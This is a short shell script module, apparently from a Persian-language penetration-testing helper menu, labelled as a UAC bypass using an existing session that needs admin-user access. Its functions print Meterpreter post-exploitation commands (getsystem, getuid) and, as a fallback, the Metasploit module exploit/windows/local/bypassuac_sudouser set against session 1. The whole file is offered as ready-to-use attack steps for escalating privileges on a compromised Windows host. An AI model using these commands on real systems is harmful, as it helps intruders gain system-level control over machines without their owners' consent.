DESC="دور زدن UAC با session موجود"
REQ="session با دسترسی کاربر ادمین"
RISK="HIGH"

termux(){ echo "# داخل meterpreter: getsystem"; }

kali(){
cat <<'EOF'
# داخل meterpreter:
getsystem
getuid
# اگر شکست خورد:
use exploit/windows/local/bypassuac_sudouser
set SESSION 1
run
EOF
}
